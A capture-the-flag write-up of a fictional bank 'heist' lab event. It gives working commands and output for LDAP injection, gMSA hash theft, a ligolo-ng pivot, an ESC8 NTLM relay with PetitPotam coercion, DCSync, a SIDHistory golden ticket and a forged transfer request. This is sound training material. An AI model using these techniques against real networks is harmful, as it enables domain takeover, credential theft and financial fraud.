---
title: CyberShelter - Shelter Bank Heist (GISEC 2026 Live-Fire Event)
description: Writeup for the Shelter Bank Heist live-fire event at GISEC 2026 - LDAP injection in a bank's support lookup leaks a domain user, a BloodHound gMSA edge turns that into jump-server admin, a ligolo-ng pivot opens the firewalled parent domain, and an ESC8 NTLM relay through a hijacked SMB port into AD CS web enrollment ends with a SIDHistory golden ticket, a parent-domain DCSync, and a settled $10M transfer.
date: 2026-09-18
slug: CyberShelter-Shelter-Bank-Heist
teaser: /assets/images/shelter-bank-heist/event_landing.png
categories:
- capture the flag
- infosec
tags:
- ctf
- active directory
- ldap injection
- gmsa
- kerberoast
- esc8
- adcs
- ntlm relay
- ligolo
- sidhistory
- golden ticket
- dcsync
- pkinit
- gisec
- cybershelter
---
![Shelter Bank Heist](/assets/images/shelter-bank-heist/event_landing.png)

**Event:** CyberShelter "Shelter Bank Heist" live-fire event at GISEC 2026
**Objective:** move up to **$10,000,000** out of Shelter Bank's vault and settle it to your registered account - first settled transfer takes the crown
**Scope:** `shelter-bank.com` perimeter plus everything reachable from an issued remote-access profile
**Result:** `{"status":"SETTLED","heist_id":"H-2026-23D5AE","amount":10000000}` - leaderboard rank 3

No flags, no hints, no staged challenges. One bank, one vault, and a leaderboard ordered purely by settlement time. Registration on the event site issues each player a 16-digit Luhn-valid account number (`5388579492864420` for me) - that number is both your identity for attribution and the beneficiary account the heist has to land in.

![Player dashboard with the issued account number](/assets/images/shelter-bank-heist/player_dashboard.png)

## Recon - finding what exists

The rules literally say "finding what exists is part of the game", so we start wide. The apex `shelter-bank.com` has no A record, AWS name servers host the zone, and `crt.sh` knows nothing (the domain is fictional) - so it's pure brute force. ffuf in DNS mode with SecLists does the whole job:

```console
┌──(jamoski㉿kali)-[~/shelterbank]
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
    -u https://FUZZ.shelter-bank.com/ -mc 200,204,301,302,307,401,403 -t 60
vpn      [Status: 200]
remote   [Status: 200]
online   [Status: 200]
event    [Status: 200]
```

Each hit resolves and answers HTTPS: `vpn.shelter-bank.com` and `remote.shelter-bank.com` share 44.218.22.24, `online.shelter-bank.com` is 44.206.175.3, and `event.` is the registration site itself.

Four external surfaces. `event.` is out of scope (registration/leaderboard), `vpn.` and `remote.` serve the same employee portal, and `online.` is the retail banking site. We look at all of them.

The VPN portal is an "Employee Remote Access" sign-in wanting CORP domain credentials *plus* a 16-digit "contractor access request ID" - interesting shape, but nothing to feed it yet.

![Employee remote access portal](/assets/images/shelter-bank-heist/vpn_portal_login.png)

The retail site is where the body is. Under the marketing pages there's an "Account & Support Lookup" widget that takes a 16-digit account number and a home branch, and POSTs both to `/api/v1/lookup`:

![online.shelter-bank.com landing page](/assets/images/shelter-bank-heist/online_banking.png)

![Account & Support Lookup form](/assets/images/shelter-bank-heist/lookup_form.png)

## LDAP injection - the lookup that leaks

Reading the page source shows the lookup POSTs `account_no` and `branch` as form data to `/api/v1/lookup` and prints the raw JSON response - including the HTTP status - into the page. That last part is a gift: the API talks to us in distinct, structured error codes, so every probe teaches us something.

**Step 1 - baseline.** A valid Luhn account number with a real branch:

```console
└─$ curl -sk -X POST https://online.shelter-bank.com/api/v1/lookup \
    -d "account_no=5388579492864420&branch=nyc"
{"error":"ERR-2000","message":"No matching relationship found for this account and branch."}
```

`ERR-2000` is the application's normal "looked, found nothing" answer. The request completed fine - the data just isn't there.

**Step 2 - find which parameter is validated and which is trusted.** A quote in `account_no`:

```console
└─$ ... --data-urlencode "account_no=5388579492864420'" --data-urlencode "branch=nyc"
{"error":"ERR-1001","message":"Account number failed validation."}
```

`ERR-1001` - a different, earlier error: the account number goes through real validation (digits + Luhn), and a quote never reaches the backend. But the same quote in `branch` returns the ordinary `ERR-2000`:

```console
└─$ ... --data-urlencode "account_no=5388579492864420" --data-urlencode "branch=nyc'"
{"error":"ERR-2000","message":"No matching relationship found for this account and branch."}
```

So `branch` is not validated at all - the quote is passed downstream intact, and the backend quietly keeps working. That already smells injectable; the question is *into what*.

**Step 3 - break the backend's query syntax.** First suspicion is SQL, so try SQL-flavored payloads. `' OR '1'='1` variants all return plain `ERR-2000` - no injected rows, no SQL error. Then a closing parenthesis changes everything:

```console
└─$ ... --data-urlencode "branch=nyc') OR ('1'='1"
{"error":"ERR-1042","message":"Directory lookup failed. Reference SHELTER-1042."}
```

A brand-new error class, and the wording is the tell: **"Directory lookup failed"**. Not "database", not "syntax error near..." - a *directory*. The `)` unbalanced the filter the backend builds around our input. That's how LDAP injection presents: the value lands inside an LDAP search filter like `(branch=<input>)`, and an unmatched parenthesis makes the directory server itself reject the query. SQL would have answered a SQLi payload with rows or a driver error; instead we get directory grammar.

**Step 4 - confirm with LDAP-true behavior.** Wildcards are the cleanest test, because `*` means nothing in SQL but everything in LDAP:

```console
└─$ ... --data-urlencode "account_no=5388579492864420" --data-urlencode "branch=*"
{"display_name":"M. OKAFOR","office":"PAYMENTS-NYC","status":"ACTIVE","info":"Onboarding: Payment$Ops2026! (rotate at first login)"}
```

`branch=*` turns the filter into a presence match and the directory returns a record. Two more probes nail the backend conclusively:

```console
└─$ ... --data-urlencode "branch=*)(cn=*"     -> 200, record returned   (cn exists in the directory)
└─$ ... --data-urlencode "branch=*)(uid=*"    -> ERR-2000               (uid doesn't)
└─$ ... --data-urlencode "branch=*)(display_name=*"  -> ERR-1042        (underscore = invalid LDAP attribute syntax)
```

That last one is a lovely confirmation: `display_name` with an underscore is *invalid LDAP attribute-name grammar* and throws the directory error, while `displayName` (proper camelCase LDAP attribute) works fine. We're inside an LDAP filter, full stop.

The leaked record is the prize: `M. OKAFOR`, PAYMENTS-NYC, status ACTIVE, and an `info` field reading `Onboarding: Payment$Ops2026! (rotate at first login)` - a corporate password left in a directory attribute. The account number itself turned out to be irrelevant to the query; the lookup keys entirely on the injected `branch` filter.

**Step 5 - map the directory blind.** Since the response returns a record only when the injected filter matches, it's a boolean oracle for attribute extraction. `branch=*)(cn=m*` hits, `cn=m.*` narrows, and character-by-character enumeration extracts exact values: `cn = m.okafor`, `sAMAccountName = m.okafor`, `department = payments operations`. Probing which attribute names exist sketches the schema - `sAMAccountName`, `memberOf`, `pwdLastSet`, `objectClass` all answer true, which is Active Directory / AD-style LDAP, not OpenLDAP. So `m.okafor` is a Windows domain account in payments operations - precisely what the VPN portal's "CORP domain" login asked for.

## The VPN foothold

The remote access portal accepts `m.okafor` / `Payment$Ops2026!` - and here's the neat trick - our *registered event account number* satisfies the "contractor access request ID" field (the profile ends up "bound to request ID ending 4420", which is how the organizers attribute tunnels to players). The dashboard provisions a Pritunl `.ovpn` profile:

![VPN dashboard with profile download and employee resources](/assets/images/shelter-bank-heist/vpn_dashboard.png)

Note the "Employee resources" panel: **Core Payments Gateway** (`https://core01:8443`, "Finance department only"), plus Online Banking Admin and IT Helpdesk links that never resolve - decoys. `core01` is the money.

```console
└─$ sudo openvpn --config shelter.ovpn
[...] Initialization Sequence Completed
└─$ ip -4 addr show tun0 | grep inet
inet 10.10.90.18/24 scope global tun0
```

Split-DNS pushes `corp.shelter-bank.com` (resolver 10.10.20.10). Two operational notes that cost us time later if forgotten: the tunnel MTU is 1250 (big TLS handshakes die silently at 1500), and profile re-issue revokes the previous key, so re-downloading the profile kills a live tunnel.

## Internal map

A host sweep of 10.10.20.0/24 plus DNS brute force against the internal resolver (`fierce-hostlist.txt` over `corp.shelter-bank.com`) gives the internal layout:

| Host | IP | Role |
|---|---|---|
| DC01 | 10.10.20.10 | corp domain controller (Kerberos/LDAP/SMB) |
| APP01 / pki | 10.10.20.20 | IIS + AD CS web enrollment |
| JMP01-JMP08 | 10.10.20.51-58 | Windows Server 2022 jump boxes |
| core01 | 10.10.20.60 | payments gateway, only 8443 exposed |
| WS01 | 10.10.20.70 | workstation, RDP/WinRM only |

`m.okafor`'s creds authenticate everywhere but administer nothing, and LSASS on the jump boxes is empty - these are sterile images. BloodHound, though, finds the one edge that matters. RustHound-CE collection with the gMSA-readable account:

```console
PAYMENTS-OPS@CORP.SHELTER-BANK.COM --ReadGMSAPassword--> SVC_JMPMAINT$@CORP.SHELTER-BANK.COM
```

![BloodHound pathfinding: m.okafor -> Payments-Ops -> ReadGMSAPassword -> svc_jmpmaint$](/assets/images/shelter-bank-heist/bloodhound_gmsa_edge.jpg)

m.okafor is the sole member of Payments-Ops, and Payments-Ops can read the managed service account `svc_jmpmaint$`'s password blob:

```console
└─$ nxc ldap 10.10.20.10 -u 'm.okafor' -p 'Payment$Ops2026!' --gmsa
Account: svc_jmpmaint$  NTLM: 2aa750e1744dd9b495b55fc95a07b30c  PrincipalsAllowedToReadPassword: Payments-Ops
```

```console
└─$ nxc smb 10.10.20.51-58 -u 'svc_jmpmaint$' -H 2aa750e1744dd9b495b55fc95a07b30c
[+] corp.shelter-bank.com\svc_jmpmaint$:... (Pwn3d!)   # x8, all jump boxes
```

Local admin on all eight jump servers. Evil-WinRM into JMP01 (kept in tmux), and we have a durable position inside the corp network.

## The forest reveals itself

Two things don't fit a single-domain picture. The gateway's Basic auth realm is `SHELTER-BANK.COM` - not CORP - and the corp Administrators group references `Enterprise Admins` from `DC=shelter-bank,DC=com`. There's a parent domain. The Global Catalog on DC01 (port 3268) covers the whole forest, so we query it with the corp creds:

```console
└─$ ldapsearch -x -H ldap://10.10.20.10:3268 -D 'm.okafor@corp.shelter-bank.com' -w 'Payment$Ops2026!' \
    -b 'DC=shelter-bank,DC=com' "(objectClass=user)" sAMAccountName description
svc_swiftbridge   # description: SWIFT bridge service account (Finance infrastructure)
ea-admin          # Enterprise Admin
ssm-user          # disabled, member of Administrators (decoy)
```

`svc_swiftbridge` is finance infrastructure *and* carries the SPN `HTTP/core01.corp.shelter-bank.com` - it is the account the payments gateway runs as. The parent DC (`ec2amaz-k4dulis`, a.k.a. `dc02`) resolves to 10.10.30.10. And the trust between the domains, from the BloodHound data, is a bidirectional ParentChild trust with **`SidFilteringEnabled: False`** - file that away, it becomes the whole endgame.

## The wall - and the bridge

Two walls appear at once. From our VPN address, the parent subnet doesn't exist (all ports on 10.10.30.10 time out), and both DCs refuse to initiate outbound connections toward VPN clients (every coercion attempt returns `ERROR_BAD_NETPATH`). The jump boxes, however, sit in the corp LAN with no such restrictions - and we can prove the corp jump boxes can reach the parent DC from JMP01 itself:

```powershell
*Evil-WinRM* PS C:\> (Test-NetConnection 10.10.30.10 -Port 88).TcpTestSucceeded
True
```

JMP01's own connection table even shows a live `svchost` session to `10.10.30.10:80` - the machines talk to the parent DC normally. So the jump server is the bridge; we just have to ride it. ligolo-ng does that job: proxy on our Kali, Windows agent uploaded over SMB and run from `C:\Windows\Temp` (AppLocker enforces path rules - `%WINDIR%` and `%PROGRAMFILES%` only - which `C:\Windows\Temp` satisfies):

```console
ligolo> session -> JMP04 -> interface_create --name ligolo -> tunnel_start
└─$ sudo ip route replace 10.10.30.0/24 dev ligolo
└─$ timeout 5 bash -c 'echo > /dev/tcp/10.10.30.10/389' && echo open
open
```

The parent domain is now ours to talk to.

## Cross-realm Kerberoast (the scenic dead end)

Since `svc_swiftbridge` has an SPN, any authenticated corp user can Kerberoast it - with the twist that the SPN lives in the parent realm, so the corp KDC only hands out a cross-realm referral that must be chased against the parent KDC (reachable only through the ligolo tunnel). Rubeus from the jump box kept hitting `KDC_ERR_ETYPE_NOTSUPP` (the account is AES-only and the referral chain kept presenting RC4); the reliable route turned out to be MIT Kerberos on our box, forcing TCP and driving the referral chase itself:

```console
└─$ impacket-getTGT -hashes :2aa750e1744dd9b495b55fc95a07b30c 'corp.shelter-bank.com/svc_jmpmaint$'
└─$ KRB5_CONFIG=krb5.conf KRB5CCNAME=jmpmaint.ccache kvno HTTP/core01.corp.shelter-bank.com
HTTP/core01.corp.shelter-bank.com@CORP.SHELTER-BANK.COM: kvno = 6
        Ticket server: HTTP/core01.corp.shelter-bank.com@SHELTER-BANK.COM
        Etype (skey, tkt): aes256-cts-hmac-sha1-96
```

Pulling the ticket out of the ccache and reshaping it into hashcat mode 19700 format is a matter of ASN.1-parsing the Ticket and emitting `cipher[:12]` / `cipher[12:]` as checksum/edata. The KDC flatly refuses RC4 for this account, so no downgrade shortcut exists, and AES256 over a wordlist on CPU is impractical.
## The gateway's rules

While the crack smoldered we mapped the actual target. `https://core01:8443` serves a default nginx page at `/`, but `/docs` and `/openapi.json` are unauthenticated FastAPI surfaces that document the entire payments API:

```json
GET  /api/v1/health                  (open)
GET  /api/v1/accounts                (auth via x-remote-user)
GET  /api/v1/accounts/{account_no}   (auth, balance included)
POST /api/v1/transfers               (auth; source_account, beneficiary=YOUR registered number, amount <= $10,000,000)
```

Every identity we control - m.okafor, svc_jmpmaint$, even over properly-formed Kerberos Negotiate - earns a 401 from nginx (`WWW-Authenticate: Negotiate` + `Basic realm="SHELTER-BANK.COM"`). The gateway wants a parent-domain finance identity. No nginx/backend parser differential, no path normalization trick, no method games - we tried the lot.

## Relay hard lessons (2022 hardening)

The classic plan was coerce-a-DC, relay to LDAP, RBCD the DC, DCSync. The environment is patched against all of it, which we learned one failure at a time:

- SMB→LDAP dies on "client requested signing"; `--remove-mic` passes that check but the bind still fails - CVE-2019-1040 MIC enforcement is fully on
- coerced auth from the parent DC additionally carries `MsvAvSingleHost` and a client-computed Target Name, and *every* acceptor (AD LDAP, LDAPS, IIS) rejects it - Server 2022 clients compute the target name from the connection, not the challenge
- certsrv rejects that auth too... **but** - and this is the asymmetry that wins the event - the corp DC's coerced auth (`CORP/DC01$`) carries no such restrictions and sails through IIS

So: ESC8, against the Enterprise CA's web enrollment on dc02, with DC01$ as the coerced victim.

## ESC8 - one certificate to rule the child domain

certipy had reported the Enterprise CA's web enrollment "disabled" - a false negative, since its check failed while dc02 was unreachable from the VPN. Through the tunnel, `http://10.10.30.10/certsrv/` answers 401→200 with NTLM. (The *other* CA in the environment, "Shelter Legacy CA" on APP01, is a standalone honeypot: web requests there pend approval forever and its root isn't in NTAuth.)

One plumbing problem remains: a coerced SMB callback always targets port 445, and every Windows box already owns 445 with its own SMB server. So we evict it - on JMP07 we disable the SMB driver stack and reboot:

```powershell
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\srvnet2      -Name Start -Value 4
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\srv2         -Name Start -Value 4
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer -Name Start -Value 4
Restart-Computer -Force
```

Port 445 on `10.10.20.57` comes back unbound. A ligolo **listener** on the JMP07 agent forwards it to the relay on our Kali:

```console
ligolo> session -> JMP07
ligolo> listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445
INFO Listener 0 created on remote agent!
```

Now the relay (ntlmrelayx in ADCS mode, requesting a DomainController cert) plus PetitPotam against DC01 with the jump box as the callback:

```console
└─$ sudo ./relayvenv/bin/python ./relayvenv/bin/ntlmrelayx.py \
    -t http://10.10.30.10/certsrv/certfnsh.asp --adcs --template DomainController -smb2support
└─$ coercer coerce -t 10.10.20.10 -l 10.10.20.57 -u 'svc_jmpmaint$' \
    --hashes ':2aa750e1744dd9b495b55fc95a07b30c' -d corp.shelter-bank.com \
    --auth-type smb --filter-protocol-name MS-EFSR
[*] (SMB): Authenticating connection from CORP/DC01$@127.0.0.1 against http://10.10.30.10 SUCCEED
[*] http://CORP/DC01$@10.10.30.10 -> GOT CERTIFICATE! ID 126
[*] http://CORP/DC01$@10.10.30.10 -> Writing PKCS#12 certificate to ./DC01.pfx
```

`DC01.pfx` - a Domain Controller certificate for the corp DC, minted by the forest-root CA. One tooling note for anyone replaying this: impacket's ADCS attack still calls `crypto.X509Req`, which pyOpenSSL removed in v24 - run ntlmrelayx from a venv pinned to `pyopenssl==23.3.0` or it crashes mid-relay with a confusing AttributeError.

## PKINIT to domain dominance

The cert is a credential. certipy turns it into a TGT and, courtesy of the PAC credentials extension, the DC machine account's NT hash:

```console
└─$ certipy-ad auth -pfx DC01.pfx -dc-ip 10.10.20.10 -username 'DC01$' -domain corp.shelter-bank.com
[*] Got hash for 'dc01$@corp.shelter-bank.com': aad3b435...:3df09ad1f2988503ba773653d39b519e
```

A DC machine account can DCSync its own domain. The entire corp directory falls:

```console
└─$ impacket-secretsdump -hashes ':3df09ad1f2988503ba773653d39b519e' 'corp.shelter-bank.com/DC01$@10.10.20.10' -just-dc
Administrator:500:...:51f5e0a075d273c45565670539be62a3:::
krbtgt:502:...:aeefb59e8fd1372d4899b25f3e999443:::
krbtgt:aes256-cts-hmac-sha1-96:9e7cbf8c8153179ddf1208ec073092608c2a4d638efa26b6cc40584100d4095f
corpadmin:1111:...:b0ed4d64ddc0244a8cbb07d4c6b6acf2:::
```

## SIDHistory across the trust

Remember `SidFilteringEnabled: False`? A golden ticket forged in the child domain with the parent's **Enterprise Admins** SID in SIDHistory is honored by the parent. Two landmines on this step, both learned the hard way:

- ticketer defaults the PAC user RID to 500; corpadmin is RID 1111, and the KDC answers a mismatch with the magnificently unhelpful `KDC_ERR_TGT_REVOKED`
- an RC4-encrypted golden TGT is rejected outright - sign with krbtgt's AES256 key

```console
└─$ impacket-ticketer -aesKey 9e7cbf8c81...4095f \
    -domain-sid S-1-5-21-2246585776-3963567594-1129428140 -domain corp.shelter-bank.com \
    -user-id 1111 -extra-sid S-1-5-21-231690178-2029500065-3326336826-519 corpadmin
└─$ KRB5CCNAME=golden.ccache kvno ldap/ec2amaz-k4dulis.shelter-bank.com
kvno = 3     # corp KDC referral -> parent KDC -> service ticket as Enterprise Admin
```

Enterprise Admin ticket in hand, DCSync the parent domain and take the one account we actually came for:

```console
└─$ KRB5CCNAME=golden.ccache impacket-secretsdump -k -no-pass -just-dc-user svc_swiftbridge \
    'corp.shelter-bank.com/corpadmin@ec2amaz-k4dulis.shelter-bank.com'
SHELTER-BANK.COM\svc_swiftbridge:1106:...:a387c282df8d8dc24bed30ad478bf2ac:::
SHELTER-BANK.COM\svc_swiftbridge:aes256-cts-hmac-sha1-96:7ad051d2f79ec9cc08c0debd67baf7f36df524888fc4346e94381dbd00e39eac
```

## The heist

svc_swiftbridge's AES256 key buys a TGT from the parent KDC, and a service ticket to `HTTP/core01.corp.shelter-bank.com` follows through the referral chain. Getting curl's SPNEGO to actually present it took three krb5.conf tweaks worth writing down:

- connect by **FQDN** - the SPN is registered on the full name, not `core01`
- `rdns = false` and `dns_canonicalize_hostname = false` - otherwise GSS reverse-resolves the IP to `ip-10-10-20-60.ec2.internal` and asks for a nonexistent SPN
- a `[domain_realm]` override `core01.corp.shelter-bank.com = SHELTER-BANK.COM` so libgssapi (which doesn't chase cross-realm referrals) asks the right realm directly

```console
└─$ KRB5_CONFIG=krb5.conf KRB5CCNAME=swift.ccache curl -sk --negotiate -u : \
    https://core01.corp.shelter-bank.com:8443/api/v1/accounts
[{"account_no":"4000000000000010","holder":"Shelter Alpha Hedge Fund LP"}, ...]
```

HTTP 200. The vault inventory: hedge funds, treasury sweeps, payroll concentration accounts - with nine-figure balances. One call to move the money:

```console
└─$ curl -sk --negotiate -u : -X POST \
    https://core01.corp.shelter-bank.com:8443/api/v1/transfers \
    -H 'Content-Type: application/json' \
    -d '{"source_account":"4000000000000010","beneficiary":"5388579492864420","amount":10000000,"currency":"USD","reference":"shelter heist"}'
{"status":"SETTLED","heist_id":"H-2026-23D5AE","source_account":"4000000000000010","beneficiary":"5388579492864420","amount":10000000,"currency":"USD","source_balance_after":2399970000000,"ledger_ts":"2026-09-18T10:53:57Z"}
```

`SETTLED`. $10,000,000 to our registered account.

![Leaderboard - jamoski, rank 3, settled](/assets/images/shelter-bank-heist/leaderboard.png)

## Leaderboard

Third to settle: **#1 l3af, #2 z0ro, #3 jamoski**. The two ahead won on speed; we took the long way through the forest and enjoyed every relay failure.

## Kill chain recap

1. **LDAP injection** in `online.shelter-bank.com`'s support lookup (`branch=*`) → creds for `m.okafor` (Payments-Ops)
2. VPN portal: those creds + our registered account number as the contractor request ID → `.ovpn` profile
3. BloodHound edge `Payments-Ops --ReadGMSAPassword--> svc_jmpmaint$` → gMSA hash → **admin on all eight jump servers**
4. **ligolo-ng** through a jump server → reach the firewalled parent domain (10.10.30.0/24)
5. Cross-realm Kerberoast of `svc_swiftbridge` (AES256 TGS - parked as the brute-force fallback)
6. **ESC8**: free port 445 on JMP07 (kill the SMB stack, reboot) → ligolo listener → PetitPotam DC01$ → relay to AD CS web enrollment on dc02 → `DC01.pfx`
7. **PKINIT** → DC01$ NT hash → **DCSync corp** → krbtgt + corpadmin
8. **Golden ticket** with SIDHistory=Enterprise Admins over the unfiltered trust → **DCSync parent** → svc_swiftbridge
9. Kerberos Negotiate auth to the Core Payments Gateway → `POST /api/v1/transfers` → **$10M SETTLED**

## Lessons

- Read the error codes. `ERR-2000` vs `ERR-1042` was the difference between "SQLi" and "LDAP injection" - and the whole event hinged on it.
- BloodHound first, always. One gMSA edge replaced hours of blind hunting.
- "Unreachable" is a routing problem, not a wall - a jump box plus ligolo dissolves segmentation.
- certipy's "web enrollment: disabled" was a timeout wearing a costume. Verify reachability before trusting a negative.
- Server 2022's NTLM hardening (MIC enforcement, SingleHost AV pairs) kills most relay muscle memory - but not all clients carry the restrictions, and AD CS web enrollment remains the softest target in the room.
- Trusts without SID filtering are forest compromise. Child DA is Enterprise Admin; it just takes a golden ticket with the right extra SID.
